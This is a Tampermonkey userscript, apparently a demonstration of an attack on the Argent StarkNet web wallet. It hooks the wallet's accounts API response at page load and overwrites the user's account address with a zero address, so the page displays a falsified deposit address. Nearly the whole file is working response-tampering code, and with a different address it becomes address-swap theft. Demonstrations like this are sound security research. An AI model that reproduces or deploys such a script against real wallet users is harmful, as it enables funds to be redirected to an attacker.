// ==UserScript==
// @name         https://web.argent.xyz/
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  The purpose of this script is solely for the demonstration of non-exploit related attacks.
// @author       https://github.com/jayden-sudo
// @match        https://web.argent.xyz/*
// @icon         https://www.google.com/s2/favicons?domain=web.argent.xyz
// @grant        none
// @run-at       document-start
// @require      https://greasyfork.org/scripts/476730-ajaxhooker-2/code/ajaxHooker_2.js?version=1259979
// ==/UserScript==

/*
    This is an example of a wallet attack

    The specific sample items will be gradually increased.
    Since there is no test token for testing at the moment, the current example includes the following content:
    1. Modifying the user's wallet address, changing the user's deposit address to: 0x0000000000000000000000000000000000000000000000000000000000000000.

*/

(function () {
    'use strict';

    // ajaxHooker.filter([
    //     { type: 'xhr', url: 'cloud.argent-api.com' }
    // ]);

    ajaxHooker.hook(request => {
        if (request.url === 'https://cloud.argent-api.com/v1/accounts?application=webwallet&chain=starknet') {
            request.response = res => {
                /* 
                        {
                            "accounts": [
                                {
                                    "address": "0x00782c62e6f81e81f110161ecca8b6e2dc92df7f31c706f6d69e159f2bb9f616",
                                    "ownerAddress": "0x03440ab3775face403531ecc39c9db639d929d6a9198764bf52047786ac30715",
                                    "chain": "starknet",
                                    "deploymentStatus": "notDeployed",
                                    "application": "webwallet",
                                    "guardianAddresses": [
                                        "0x014e233bc7d7342e4de1ca63f8b60581994c8572df178829888550fc8f044a18"
                                    ],
                                    "contractName": "ArgentAccount",
                                    "contractVersion": "0.3.0",
                                    "implClassHash": "0x01a736d6ed154502257f02b1ccdf4d9d1089f80811cd6acad48e6b6a9d1f2003",
                                    "salt": "0x313cd8bdf4b2498fd71dcb80206aac835fd6733128bc10cb8caeed38a107024"
                                }
                            ]
                        }
                */
                res.json.accounts[0].address = "0x0000000000000000000000000000000000000000000000000000000000000000";
                res.responseText = JSON.stringify(res.json);
            };
        }
    });

})();


